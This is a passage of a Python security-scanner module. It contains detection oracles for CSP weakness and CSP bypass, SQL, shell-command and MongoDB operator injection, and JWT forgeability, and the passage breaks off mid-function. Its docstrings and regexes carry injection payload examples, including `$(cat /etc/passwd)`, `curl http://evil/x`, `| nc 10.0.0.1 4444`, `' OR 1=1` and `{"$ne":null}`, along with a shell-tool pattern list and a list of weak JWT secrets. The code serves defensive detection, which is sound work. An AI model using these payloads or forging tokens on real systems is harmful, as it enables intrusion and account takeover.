                           evidence=f"unrecognised/lead-only CSP rule {rule!r} (stays a lead)")
    url = _coerce_text(observed_control.get("url")).strip()
    where = f" for {url}" if url else ""
    if bool(observed_control.get("report_only")):
        return _csp_signal(
            False, observed={"rule": rule, "report_only": True},
            evidence=("the retained CSP is REPORT-ONLY (Content-Security-Policy-Report-Only) — it enforces "
                      "nothing, so a permissive value here is not an enforced weakness (stays a lead)"))
    header = _coerce_text(observed_control.get("header"))
    if not header.strip():
        return _csp_signal(
            False, observed={"rule": rule},
            evidence="no retained enforced CSP header to judge — CSP posture UNOBSERVED (REFUSE)")
    directives = _parse_csp(header)
    eff = _effective_script_src(directives)
    if eff is None:
        return _csp_signal(
            False, observed={"rule": rule},
            evidence=("the retained CSP declares neither script-src nor default-src — no effective "
                      "script restriction to judge for THIS oracle (stays a lead; a scriptless-CSP "
                      "weakness is a distinct claim)"))
    src_dir = "script-src" if "script-src" in directives else "default-src"
    lower = [t.lower() for t in eff]
    has_nonce_or_hash = any(_CSP_NONCE_HASH_RE.match(t) for t in eff)
    # CSP3: 'strict-dynamic' makes conformant browsers IGNORE host-source and scheme-source expressions
    # ('*', http:, https:, 'self', specific hosts) AND 'unsafe-inline'. Beside 'strict-dynamic' those are
    # therefore NOT weaknesses — flagging them false-flags the Google/OWASP-canonical hardened policy
    # (`'nonce-r' 'strict-dynamic' https: http: 'unsafe-inline'`). 'unsafe-eval' is NOT neutralized by
    # 'strict-dynamic' (eval stays enabled), so it is still flagged.
    has_strict_dynamic = "'strict-dynamic'" in lower
    weaknesses: list[str] = []
    if "'unsafe-inline'" in lower and not has_nonce_or_hash and not has_strict_dynamic:
        weaknesses.append("'unsafe-inline' with no neutralizing nonce/hash")
    if "'unsafe-eval'" in lower:
        weaknesses.append("'unsafe-eval'")
    if "*" in lower and not has_strict_dynamic:
        weaknesses.append("wildcard '*' source")
    if "http:" in lower and not has_strict_dynamic:
        weaknesses.append("'http:' scheme source")
    if "data:" in lower and not has_strict_dynamic:
        weaknesses.append("'data:' scheme source")
    if not weaknesses:
        note = (" ('strict-dynamic' present — host/scheme sources and 'unsafe-inline' are ignored by the "
                "browser per CSP3, not a weakness)" if has_strict_dynamic else
                (" ('unsafe-inline' is present but NEUTRALIZED by a nonce/hash — not a weakness)"
                 if ("'unsafe-inline'" in lower and has_nonce_or_hash) else ""))
        return _csp_signal(
            False, observed={"rule": rule, "effective_directive": src_dir, "script_src": eff},
            evidence=(f"the effective {src_dir} carries no permissive weakness — a well-formed policy"
                      f"{note} (no fire)"))
    return _csp_signal(
        True, conf=0.9,
        evidence=(f"the enforced CSP's effective {src_dir}{where} is permissive: "
                  + "; ".join(weaknesses)
                  + " — script execution is not effectively restricted (a real CSP weakness)"),
        observed={"rule": rule, "url": url or None, "effective_directive": src_dir,
                  "script_src": eff, "weaknesses": weaknesses})


def csp_purports_to_block(observed_control: Any) -> bool:
    """The achieved-CSP-bypass guard: True iff a RETAINED, ENFORCED (non-report-only) CSP whose effective
    ``script-src`` is RESTRICTIVE — it purported to block an arbitrary injected script — was present, so a
    canary that NONETHELESS EXECUTED is a genuine BYPASS. False when the CSP is absent, report-only, has no
    effective script-src, or is PERMISSIVE (``'unsafe-inline'`` unneutralized, a wildcard ``*``, or an
    ``http:``/``data:`` scheme source) — under a permissive/absent policy the execution was permitted /
    unrestricted, so it is plain DOM-XSS, never a bypass. Conservative by design (a permissive policy's
    gadget bypass stays a LEAD): the FACT mints ONLY when a restrictive policy was defeated. Pure +
    deterministic; never raises."""
    if not isinstance(observed_control, Mapping):
        return False
    if bool(observed_control.get("report_only")):
        return False
    header = _coerce_text(observed_control.get("header"))
    if not header.strip():
        return False
    eff = _effective_script_src(_parse_csp(header))
    if eff is None:
        return False
    lower = [t.lower() for t in eff]
    has_nonce_or_hash = any(_CSP_NONCE_HASH_RE.match(t) for t in eff)
    # 'strict-dynamic' (CSP3) makes the browser IGNORE host/scheme sources AND 'unsafe-inline', so a
    # strict-dynamic policy IS restrictive (it blocks an arbitrary injected script) — a canary that
    # nonetheless executes under it is a genuine bypass. Do not treat those tokens as permissive then.
    has_strict_dynamic = "'strict-dynamic'" in lower
    inline_allowed = ("'unsafe-inline'" in lower) and not has_nonce_or_hash and not has_strict_dynamic
    permissive = inline_allowed or (not has_strict_dynamic and ("*" in lower or "http:" in lower or "data:" in lower))
    return not permissive


def dom_execution_csp_bypass_oracle(binding_calls: Any, canary: str, csp_control: Any) -> OracleSignal:
    """The achieved-CSP-bypass adjudication: the DOM_EXECUTION oracle, additionally GUARDED so it fires
    ONLY when the injected canary EXECUTED (``dom_execution_oracle`` fires) AND the RETAINED enforced CSP
    purported to block that execution (``csp_purports_to_block``). If execution occurred but the CSP did
    NOT purport to block (absent / report-only / permissive), it is plain DOM-XSS, NOT a bypass — the
    signal is returned NON-firing so a no-CSP (or permissive-CSP) execution can never be relabelled a
    bypass and a tampered (permissive) CSP cannot mint the FACT offline. Reuses OracleKind.DOM_EXECUTION
    (no new kind). Pure + deterministic; never raises."""
    sig = dom_execution_oracle(binding_calls, canary)
    if not sig.fired:
        return sig
    if csp_purports_to_block(csp_control):
        obs = dict(sig.observed)
        obs["csp_bypassed"] = True
        return OracleSignal(
            kind=OracleKind.DOM_EXECUTION, fired=True, confidence=sig.confidence,
            evidence=(sig.evidence + " — DESPITE a retained enforced CSP whose script-src purported to "
                      "block it (a genuine CSP bypass, not DOM-XSS on a permissive/absent policy)"),
            observed=obs)
    obs = dict(sig.observed)
    obs["csp_bypassed"] = False
    return OracleSignal(
        kind=OracleKind.DOM_EXECUTION, fired=False, confidence=0.0,
        evidence=("injected script executed, but no retained ENFORCED CSP purported to block it "
                  "(absent / report-only / permissive script-src) — this is plain DOM-XSS, NOT a CSP "
                  "bypass (the csp_bypass FACT refuses)"),
        observed=obs)


# ---------------------------------------------------------------------------
# AEGIS request-side PARSE-PROOF oracles (the inline "provable firewall" gateway).
#
# These judge a single DECODED request-parameter value on the REQUEST ALONE (no app response). They
# fire ONLY on a deterministic PARSE-PROOF that the value breaks grammar — mirroring how
# reflection_context_oracle PARSES to prove an executable context rather than substring-matching. A
# fire proves a STRUCTURED INJECTION ATTEMPT (a benign user never sends grammar-breaking SQL/shell),
# NOT that the app is exploited — an app that parameterises is still safe, and the response-side
# oracles (differential/error_signature/reflection_context) are what prove exploitation. The bar is
# deliberately TIGHT for near-zero false positives: raw payload signatures / lone metacharacters stay
# a LEAD (belief-raising), never a fire. Pure and deterministic (no wallclock/rng); ReDoS-safe
# (fixed-alternation, non-backtracking regexes over a length-capped value).
# ---------------------------------------------------------------------------

# SQL structure that, ANCHORED at the START of a break-out tail (immediately after the closing
# quote, modulo whitespace/parens), proves the value altered the query grammar. Anchoring is the
# near-zero-FP discipline: a real injection puts its structure right after the break-out quote
# (`' OR 1=1`, `'; DROP TABLE`), whereas prose has ordinary words between the (contraction) apostrophe
# and any SQL-looking token (`Don't drop the ball` -> tail `t drop the ball` has no structure at the
# start). A tautology must be a genuine SELF-comparison (`X=X`) — a bare number or a distant `or 5`
# is NOT a proof (that was the "5 or 6 options" false positive).
_SQL_TAUT_RE = re.compile(
    r"""(?i)^(OR|AND|XOR)\b\s*\(?\s*['"]?([A-Za-z0-9_]+)['"]?\s*(?:=|<=>|\bLIKE\b)\s*['"]?([A-Za-z0-9_]+)['"]?""")
_SQL_UNION_RE = re.compile(r"(?i)^UNION\b\s+(?:ALL\s+)?SELECT\b")
# A stacked statement must have a real STATEMENT SHAPE — the leading keyword AND its required
# companion (SELECT..FROM, INSERT..INTO, DROP TABLE, ...). SELECT/UPDATE/DELETE/DROP are also ordinary
# English verbs, so `; select the file` / `; delete the row` (benign UI/support prose) must NOT match;
# requiring the second keyword is what separates a statement from a verb. `.{0,120}?` is lazy+bounded
# (ReDoS-safe).
_SQL_STACK_RE = re.compile(
    r"(?is)^;\s*(?:"
    r"SELECT\b.{0,120}?\bFROM\b"
    r"|INSERT\b.{0,40}?\bINTO\b"
    r"|UPDATE\b.{0,80}?\bSET\b"
    r"|DELETE\b.{0,40}?\bFROM\b"
    r"|DROP\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER)\b"
    r"|CREATE\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER|PROCEDURE)\b"
    r"|ALTER\s+(?:TABLE|DATABASE|USER|SCHEMA)\b"
    r"|TRUNCATE\s+TABLE\b"
    r"|GRANT\b.{0,80}?\bTO\b"
    r"|EXEC(?:UTE)?\b\s+\w"
    r")")


def _sql_breakout_tails(text: str, quote: str):
    """Yield the QUERY-context tail after EACH UNESCAPED `quote` in `text` (the injection point is
    `... WHERE x=<quote>PAYLOAD<quote>`, and any quote in the payload could be the break-out). Honours
    `''` doubling and `\\` escapes so a legitimately-escaped quote stays inside the literal."""
    i, n = 0, len(text)
    while i < n:
        c = text[i]
        if c == "\\" and i + 1 < n:
            i += 2                                  # backslash-escaped char stays in the literal
            continue
        if c == quote:
            if i + 1 < n and text[i + 1] == quote:
                i += 2                              # doubled quote ('' or "") = an escaped quote
                continue
            yield text[i + 1:]                      # unescaped closing quote -> a candidate tail
        i += 1


def _sql_structure_at_start(tail: str) -> str:
    """The SQL structure PROVEN present at the START of a break-out tail, or "" — the near-zero-FP
    proofs, each ANCHORED immediately after the break-out (leading whitespace/parens skipped): a
    boolean SELF-tautology (`OR 1=1`, `OR 'a'='a'`), a `UNION [ALL] SELECT`, or a stacked statement
    with a full statement shape (`; DROP TABLE`, `; SELECT .. FROM`). A lone comment (`--`/`/*`) is
    DELIBERATELY not a proof — `'Inception' -- best film`, pasted code comments, and prose em-dashes
    after a quoted word produce it, so it was a false positive; an attacker's comment almost always
    follows a tautology/UNION we already catch. Prose after an apostrophe never matches."""
    s = tail.lstrip().lstrip("()").lstrip()
    if not s:
        return ""
    m = _SQL_TAUT_RE.match(s)
    if m and m.group(2).lower() == m.group(3).lower():
        return f"{m.group(1).upper()} tautology ({m.group(2)}={m.group(3)})"
    if _SQL_UNION_RE.match(s):
        return "UNION SELECT"
    if _SQL_STACK_RE.match(s):
        return "stacked statement"
    return ""


def sql_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
    """Fire iff `payload`, placed inside a SQL string literal, PROVABLY closes it and introduces query
    STRUCTURE IMMEDIATELY after the break-out (a self-tautology / UNION SELECT / stacked statement /
    terminating comment). Proves a structured SQL injection ATTEMPT — never exploitation. The
    STRUCTURE must be anchored to the break-out quote, so ordinary apostrophe-bearing prose is safe:
    `O'Brien`, `it's fine`, `Don't drop the ball; I'll update you`, `I've got 5 or 6 options`,
    `credit union, please select` all have only text after the apostrophe and never fire.
    Pure/deterministic."""
    kind = OracleKind.SQL_INJECTION_BREAKOUT
    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
    if len(text) < 3 or ("'" not in text and '"' not in text):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no string-literal break-out (no quote to close the literal)",
                            observed={"param": param})
    for quote in ("'", '"'):
        for tail in _sql_breakout_tails(text, quote):
            struct = _sql_structure_at_start(tail)
            if struct:
                return OracleSignal(
                    kind=kind, fired=True, confidence=0.92,
                    evidence=(f"payload closes a {quote} SQL string literal and introduces query "
                              f"structure ({struct}) at the break-out — a structured SQL injection attempt"),
                    observed={"param": param, "quote": quote, "structure": struct, "break_out": True})
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence="quote present but no SQL structure anchored to a break-out (inert prose, e.g. an apostrophe in text)",
        observed={"param": param})


# Dangerous command binaries. A BARE command name is NOT a proof — ordinary prose, jQuery `$(id)`,
# and markdown `` `code` `` all contain command-like words — so a fire additionally REQUIRES a
# shell-ARGUMENT indicator (a SYSTEM path, `./`/`../`, a `-flag`, a URL, or an IPv4) next to the
# command. Comparison operators (`>`/`|`) and version slashes (`tool/1.2.3`) are DELIBERATELY excluded:
# `id > 1000` and `python-requests/2.25.1` are benign, and treating them as shell args was a false
# positive.
_SHELL_CMDS = ("cat", "ls", "id", "whoami", "uname", "nc", "ncat", "netcat", "curl", "wget", "bash",
               "sh", "zsh", "ksh", "powershell", "pwsh", "nslookup", "dig", "cmd", "python", "python3",
               "perl", "ruby", "php", "chmod", "chown", "mkfifo", "telnet", "socat", "base64", "xxd",
               "hostname", "ifconfig", "ping", "certutil", "sleep", "rm", "kill", "env")
_CMD_ALT = "|".join(sorted(set(_SHELL_CMDS), key=len, reverse=True))
_SHELL_CMD_RE = re.compile(r"(?i)(?<![A-Za-z0-9_])(" + _CMD_ALT + r")(?![A-Za-z0-9_])")
_SHELL_CMD_AT_START_RE = re.compile(r"(?i)^(" + _CMD_ALT + r")(?![A-Za-z0-9_])")
# A command SUBSTITUTION body: $(...) or `...`. The bounded, negated char classes are LINEAR (no
# backtracking), so this is ReDoS-safe on adversarial input.
_SHELL_SUBST_RE = re.compile(r"\$\(([^)]{1,300})\)|`([^`]{1,300})`")
# A shell-ARGUMENT indicator — restricted to unambiguous shell shapes: a FILESYSTEM path (a leading
# `/` into a known system dir, or `./`/`../`), a `-flag`, a URL, or an IPv4. A bare `>`/`|` (a
# comparison/pipe in prose) and a `tool/version` slash are NOT indicators.
_SHELL_SYS_DIRS = ("etc", "bin", "usr", "tmp", "var", "dev", "proc", "root", "sys", "opt", "home",
                   "sbin", "lib", "lib64", "mnt", "srv", "boot", "run", "media")
_SHELL_ARG_RE = re.compile(
    r"(?i)(?:/(?:" + "|".join(_SHELL_SYS_DIRS) + r")\b|\.\.?/|(?<=\s)-[a-z]{1,3}\b"
    r"|https?://|\b\d{1,3}(?:\.\d{1,3}){3}\b)")


def command_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
    """Fire iff `payload` contains an OS-command-execution construct PROVEN by a dangerous command
    invoked WITH a shell argument — inside a command substitution (`$(cat /etc/passwd)`, `` `curl
    http://evil/x` ``), or AFTER a command separator (`; cat /etc/passwd`, `| nc 10.0.0.1 4444`).
    Conservative for near-zero FP: (a) a bare command name is not a proof, so a shell argument is
    required; (b) the separator branch SKIPS the first segment (a value that merely BEGINS with a
    command word — `python-requests/2.25.1`, `id > 1000` — had no preceding separator and is benign);
    (c) `>`/`|` and `tool/version` slashes are not arguments. So `$(id)` / `` `code` `` / `dog|cat` /
    `Name | Age | ID` / `id > 1000` / `python-requests/2.25.1` do NOT fire. ReDoS-safe (split on the
    separator class). Pure/deterministic; proves an ATTEMPT, never exploitation."""
    kind = OracleKind.COMMAND_INJECTION_BREAKOUT
    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
    if len(text) < 4:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="too short to carry a command-execution construct",
                            observed={"param": param})
    # (1) command substitution wrapping a dangerous command WITH an argument. `$(...)` / backticks are
    # already a strong shell signal, so a whitespace-separated argument also suffices — `$(id)` /
    # `` `code` `` / `$(document)` do NOT fire, but `$(sleep 5)` / `$(cat /etc/passwd)` do.
    for m in _SHELL_SUBST_RE.finditer(text):
        body = m.group(1) or m.group(2) or ""
        cmd = _SHELL_CMD_RE.search(body)
        if not cmd:
            continue
        after = body[cmd.end():]
        # a command immediately followed by `=` is a key=value / assignment / URL query param
        # (`id=https://...`), NOT a command invocation — the review's header/cookie false positive.
        if after[:1] == "=":
            continue
        if _SHELL_ARG_RE.search(after) or re.match(r"\s+\S", after):
            return OracleSignal(
                kind=kind, fired=True, confidence=0.9,
                evidence=(f"shell command substitution invokes {cmd.group(1)!r} with an argument — "
                          f"a structured OS command injection attempt"),
                observed={"param": param, "construct": "substitution", "command": cmd.group(1).lower()})
    # (2) a command SEPARATOR then a dangerous command WITH a shell argument. Split on the separator
    #     class (linear, no backtracking) and inspect each segment AFTER a real separator — segment[0]
    #     had NO preceding separator, so a value that merely starts with a command word is not a proof.
    for seg in re.split(r"[;|&\n\r]", text)[1:]:
        seg = seg.strip()
        cmd = _SHELL_CMD_AT_START_RE.match(seg)
        if not cmd:
            continue
        after = seg[cmd.end():]
        # `id=https://cdn/...` (a `&`-split URL query param in a Referer/cookie) is a key=value, NOT a
        # command invocation — the review's header/cookie command-injection false positive.
        if after[:1] == "=":
            continue
        if _SHELL_ARG_RE.search(after):
            return OracleSignal(
                kind=kind, fired=True, confidence=0.9,
                evidence=(f"a command separator chains to {cmd.group(1)!r} with an argument — "
                          f"a structured OS command injection attempt"),
                observed={"param": param, "construct": "separator+command", "command": cmd.group(1).lower()})
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence="no command-execution construct (a bare command name or lone metacharacter is not a proof)",
        observed={"param": param})


# ---------------------------------------------------------------------------
# Wave-G2 NoSQL (MongoDB-style) operator-injection break-out oracle (the NOSQL_INJECTION_BREAKOUT kind).
#
# The request-side sibling of the SQL/command break-out oracles: it judges a single decoded request
# value AND its parameter NAME on the REQUEST ALONE, and fires ONLY on a deterministic parse-proof that
# a MongoDB QUERY OPERATOR was injected as a KEY where the app declared a SCALAR. A fire proves a
# STRUCTURED NoSQL operator-injection ATTEMPT (a benign user never sends operator-as-key structure), NOT
# that the app is exploited — an app that coerces the param to a string is still safe. Two re-runnable
# proofs, each near-zero-FP:
#   (1) the PARAM NAME carries a `$operator` as a whole bracket/dot KEY SEGMENT — `user[$ne]`, `q[$gt]`,
#       `a[b][$regex]`, `user.$ne`, or a bare `$where`. The qs/PHP/Express body-parser nests this into
#       `{user: {$ne: <value>}}`, so a query operator lands where a scalar param was declared.
#   (2) the VALUE parses to JSON and a `$operator` appears as an object KEY — `{"$ne":null}`, `{"$gt":""}`
#       (the classic `username={"$ne":1}` auth-bypass blob).
# Near-zero-FP by STRUCTURE, not signature:
#   * the token must be a KNOWN QUERY/logical operator (the curated allowlist below). The EJSON /
#     JSON-Schema / JSON-LD / DBRef `$`-keys (`$oid`, `$date`, `$numberLong`, `$binary`, `$schema`,
#     `$ref`, `$id`, `$comment`, ...) legitimately appear in bodies and are DELIBERATELY excluded — a
#     benign export/schema body never fires.
#   * it must be a KEY. A `$`-prefixed STRING VALUE (`["$ne"]`, `{"note":"use $ne"}`), a price `$5.00`,
#     `$net`, an email, a regex `^admin$`, a mid-word `$` (`pass$word`), or a plain scalar never fires.
# Pure/deterministic (no wallclock/rng/io); bounded; ReDoS-safe (fixed alternation, non-backtracking).
# ---------------------------------------------------------------------------

# The curated set of MongoDB QUERY / logical / evaluation / element / array operators whose appearance as
# an object KEY is an unambiguous injection signal. Stored WITHOUT the `$`, lowercased for a (?i) match.
# EJSON type-wrappers, JSON-Schema (`$schema`), JSON-LD, and DBRef (`$ref`/`$id`) keys are intentionally
# ABSENT — they are legitimate body content and including them would manufacture false positives.
_NOSQL_OPERATORS: frozenset[str] = frozenset({
    "ne", "eq", "gt", "gte", "lt", "lte", "in", "nin",     # comparison
    "or", "and", "nor", "not",                              # logical
    "exists",                                              # element
    "where", "expr", "mod", "text", "jsonschema",          # evaluation
    "all", "elemmatch", "size",                            # array
})
# DELIBERATELY EXCLUDED from the BLOCK allowlist (a review proved they false-positive as a hard block):
#   * `$type`  — also the .NET/System.Text.Json/Newtonsoft polymorphic type-discriminator key
#     (`{"$type":"Ns.Class, Asm"}`), extremely common benign JSON.
#   * `$regex` — also the legacy MongoDB Extended-JSON v1 serialization of a BSON regex VALUE
#     (`{"$regex":"pat","$options":"i"}`, bson.json_util legacy dumps) AND the shape a legitimate
#     regex-search API accepts. Dual-use → not offline-provable as an ATTEMPT without FPs, so it is
#     NOT a block (a $regex injection stays a lead at most). Near-zero-FP wins over coverage here.
# Longest-first alternation so a prefix operator (`gt`) cannot pre-empt its extension (`gte`); the
# key-segment lookahead below also guards this, but ordering keeps the match unambiguous.
_NOSQL_OP_ALT = "|".join(sorted(_NOSQL_OPERATORS, key=len, reverse=True))
# A `$operator` that is a WHOLE BRACKET key segment of a parameter name: preceded by start-of-string or
# `[`, and followed (lookahead) by end-of-string or `]`. So `user[$ne]`, `q[$gt]`, `a[b][$in]`, and a
# bare `$where` match; `pass$word`, `cost$negate`, and `$5.00` do NOT. DOT delimiting is deliberately
# NOT accepted: a JSON body is flattened to dotted param names (`a.b.c`), so a benign body with a literal
# key like `{"a":{"b.$ne":1}}` would flatten to `a.b.$ne` and a dot-segment rule would FALSE-fire on it
# (the review's flatten FP). Real JSON operator-KEY injection (`{"user":{"$ne":1}}`) is proven instead by
# the whole-body scan (`_nosql_operator_key`, which reads the ACTUAL parsed keys) — so dropping the dot
# form loses only the rarer dot-notation QUERY-STRING variant while eliminating the flatten false positive.
# Fixed alternation over a length-bounded name → non-backtracking.
_NOSQL_PARAM_OP_RE = re.compile(r"(?i)(?:^|\[)\$(" + _NOSQL_OP_ALT + r")(?=$|\])")
_NOSQL_JSON_CAP = 65536      # bound the JSON parse input on the value path (DoS-safe on adversarial input)
_NOSQL_SCAN_DEPTH = 32       # bound the recursion over a parsed JSON value (stack-safe)


def _nosql_operator_key(obj: Any, depth: int = 0) -> str:
    """The first KNOWN MongoDB operator appearing as an object KEY anywhere in a parsed JSON `obj` (to a
    bounded depth), returned WITH its `$` (e.g. ``"$ne"``), or "". Only a KEY counts — an operator as a
    string VALUE or a list element is inert (that is ordinary data / documentation, not query structure)."""
    if depth > _NOSQL_SCAN_DEPTH:
        return ""
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(k, str) and k[:1] == "$" and k[1:].lower() in _NOSQL_OPERATORS:
                return "$" + k[1:].lower()
            hit = _nosql_operator_key(v, depth + 1)
            if hit:
                return hit
    elif isinstance(obj, list):
        for v in obj[:256]:                                 # bounded fan-out
            hit = _nosql_operator_key(v, depth + 1)
            if hit:
                return hit
    return ""


def _nosql_operator_key_in_json_text(text: str) -> str:
    """Parse ``text`` as JSON (only when it looks like a container) and return the first operator-as-key,
    or "". A non-JSON value (a price, an email, a scalar) parses to nothing here and stays inert."""
    s = text.strip()
    if s[:1] not in ("{", "[") or len(s) > _NOSQL_JSON_CAP:
        return ""
    try:
        obj = json.loads(s)
    except (ValueError, TypeError, RecursionError):
        return ""
    return _nosql_operator_key(obj)


def nosql_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
    """Fire iff a request carries a MongoDB QUERY OPERATOR injected as a KEY where a SCALAR was expected —
    either (1) the PARAM NAME has a `$operator` as a whole BRACKET key segment (`user[$ne]`, `q[$gt]`,
    `a[b][$in]`, `$where`), which the framework nests into `{user:{$ne:…}}`; or (2) the VALUE parses to
    JSON with a `$operator` object KEY (`{"$ne":null}`). Proves a STRUCTURED NoSQL operator-injection
    ATTEMPT, never exploitation. Near-zero-FP: the token must be a KNOWN query operator (curated allowlist
    — the EJSON/JSON-Schema/DBRef `$`-keys AND the dual-use `$type`/`$regex` are excluded, since they are
    also legitimate .NET type-discriminators / EJSON regex data) AND a KEY, so a price `$5.00`, `$net`, an
    email, a regex `^admin$`, a mid-word `$` (`pass$word`), an operator as a string VALUE (`["$ne"]`), and
    a plain scalar all stay inert. Pure/deterministic; bounded; ReDoS-safe."""
    kind = OracleKind.NOSQL_INJECTION_BREAKOUT
    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
    name = param if isinstance(param, str) else str(param if param is not None else "")
    # (1) the PARAM NAME injects an operator as a nested bracket/dot KEY -> a query operator lands where a
    #     scalar param was declared. The strongest proof: it is proven by the request's own key structure.
    m = _NOSQL_PARAM_OP_RE.search(name)
    if m:
        op = "$" + m.group(1).lower()
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"parameter {name!r} injects the MongoDB query operator {op!r} as a nested key where "
                      f"a scalar was expected — a structured NoSQL operator-injection attempt"),
            observed={"param": name, "operator": op, "vector": "operator_as_param_key", "break_out": True})
    # (2) the VALUE is a JSON object literal whose KEY is a known operator (`username={"$ne":null}`).
    op = _nosql_operator_key_in_json_text(text)
    if op:
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"value parses to JSON carrying the MongoDB query operator {op!r} as an object key "
                      f"where a scalar was expected — a structured NoSQL operator-injection attempt"),
            observed={"param": name, "operator": op, "vector": "operator_as_json_key", "break_out": True})
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence=("no NoSQL operator-injection structure (a $-prefixed KNOWN query operator as a KEY where "
                  "a scalar was expected); a $ in text/a price/an operator-shaped string value is inert"),
        observed={"param": name})


# ---------------------------------------------------------------------------
# Workstream-B SSO/JWT structural-forgery oracle (the SSO_ASSERTION_FORGERY kind).
#
# Judged on a captured JWT ALONE — offline, deterministic, ZERO forged traffic to any target. It
# promotes a token to STRUCTURALLY-FORGEABLE (a FACT anyone can re-verify from the token + the retained
# candidate keys) ONLY on a re-runnable proof, mirroring how the request-side parse-proof oracles judge
# a payload without an app response:
#
#   (a) alg=none/None      — a valid such token carries an EMPTY signature and needs NO secret, so
#       anyone can mint one with an arbitrary payload. Structural forgery by construction.
#   (b) HS* weak/known key — the token's EXACT signature is RECOMPUTABLE by HMAC over `header.payload`
#       with a supplied/weak candidate secret. An exact reproduction is a deterministic fact: whoever
#       holds that secret forges arbitrary tokens.
#   (c) RS256->HS256 confusion — the HS* signature reproduces with a supplied RSA/EC PUBLIC key (PEM)
#       as the HMAC secret. The verification material is PUBLIC, so anyone holding the public key forges
#       tokens a naive (algorithm-confusing) verifier accepts.
#
# Near-zero-FP: a normal RS256 token (an asymmetric signature, never an HMAC — the crack path is not
# even attempted for it), an HS* token whose secret is not in the candidate/weak set, and a malformed
# token all DO NOT fire. The proof is the token's OWN bytes + the retained candidate material, so a
# confirmed forgery re-verifies OFFLINE from its certificate. Pure + deterministic (no clock/rng/io).
# NOTE: the JWT primitives are re-implemented locally rather than imported from ``scanner.jwt`` — that
# module imports ``verify.adapter``, so a ``verify -> scanner`` import would be a cycle. They mirror
# ``scanner.jwt``'s codec/crack byte-for-byte.
# ---------------------------------------------------------------------------

# A small, curated set of the most notorious default/example HMAC secrets. A real random key never
# collides with these, so trying them adds coverage with no FP cost — an exact HMAC reproduction is a
# proof regardless of WHERE the secret came from (a weak key IS forgeable). Supplied ``candidate_keys``
# are tried IN ADDITION to these.
_WEAK_HS_SECRETS: tuple[str, ...] = (
    "secret", "secretkey", "secret_key", "password", "changeme", "admin", "test", "jwt",
    "jwtsecret", "jwt_secret", "jwt-secret", "key", "private", "your-256-bit-secret",
    "your_jwt_secret", "supersecret", "s3cr3t", "1234567890", "qwerty", "0000000000000000",
)

_JWT_HMAC_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
_JWT_SEG_CAP = 8192          # bound the header segment fed to the base64/JSON decoder (DoS-safe)
# Bound the HMAC SIGNING INPUT (`header.payload`) on the fire path too. A real JWT signing input is
# small (a few KB); anything past this is not a plausible token, so we decline to spend HMAC work on
# it (non-fire, stays a lead) rather than run HMAC over an attacker-sized buffer once per candidate
# key. This makes the "DoS-safe over an untrusted token" property enforced by code, not just claimed.
_JWT_SIGNING_INPUT_CAP = 65536


def _jwt_b64url_decode(seg: str) -> bytes:
    """base64url-decode one JWT segment (padding restored). Raises on malformed input."""
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _looks_like_public_key(candidate: str) -> bool:
    """True iff the candidate is PEM public-key material (an RSA/EC public key). Used ONLY to LABEL a
    confirmed HMAC reproduction as algorithm confusion vs a plain weak secret — never to gate firing."""
    return "PUBLIC KEY" in candidate


def jwt_forgery_oracle(token: Any, *, candidate_keys: Sequence[str | bytes] = ()) -> OracleSignal:
    """Fire (SSO_ASSERTION_FORGERY) iff the captured JWT ``token`` is STRUCTURALLY FORGEABLE by a proof
    re-runnable from the token alone: (a) ``alg=none``/``None``; (b) an HS* signature RECOMPUTABLE from a
    supplied/weak candidate secret; or (c) an RS256->HS256 confusion (the HS* signature reproduces with a
    supplied RSA/EC PUBLIC key as the HMAC secret). A normal RS256 token with an unknown key, an HS*
    token whose secret is not recoverable, and a malformed token DO NOT fire (near-zero-FP). Pure +
    deterministic — the verdict re-verifies offline from the token + retained candidate keys."""
    kind = OracleKind.SSO_ASSERTION_FORGERY
    text = token if isinstance(token, str) else _coerce_text(token)
    parts = text.split(".")
    if len(parts) != 3 or not parts[0] or not parts[1]:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="not a well-formed three-part JWT — nothing to adjudicate")
    try:
        header = json.loads(_jwt_b64url_decode(parts[0][:_JWT_SEG_CAP]))
    except (ValueError, binascii.Error):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="JWT header is not valid base64url JSON — cannot adjudicate")
    if not isinstance(header, Mapping):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="JWT header is not a JSON object — cannot adjudicate")
    alg = _coerce_text(header.get("alg")).strip()

    # (a) alg=none — a valid token needs NO secret; anyone can mint one. Structural forgery by
    #     construction. (All case variants: none / None / NONE / nOnE.)
    if alg.lower() == "none":
        return OracleSignal(
            kind=kind, fired=True, confidence=0.95,
            evidence=(f"alg={alg!r}: the token is UNSIGNED — a valid token needs no secret, so anyone "
                      f"can forge one with an arbitrary payload (re-verify: header.alg lowercases to 'none')"),
            observed={"proof": "alg_none", "alg": alg, "header": dict(header)})

    # (b)/(c) HS* — try to REPRODUCE the exact signature by HMAC over `header.payload`. An exact match
    #     is a deterministic proof the token is forgeable by whoever holds that secret. If the matching
    #     secret is a PUBLIC key, it is the RS256->HS256 confusion (public material => anyone forges).
    if alg.upper() in _JWT_HMAC_HASH:
        hasher = _JWT_HMAC_HASH[alg.upper()]
        # bound the HMAC signing input before spending work per candidate key (DoS-safe on an
        # attacker-sized token — an oversized "token" is not a real JWT, so we stay a lead).
        if len(parts[0]) + 1 + len(parts[1]) > _JWT_SIGNING_INPUT_CAP:
            return OracleSignal(
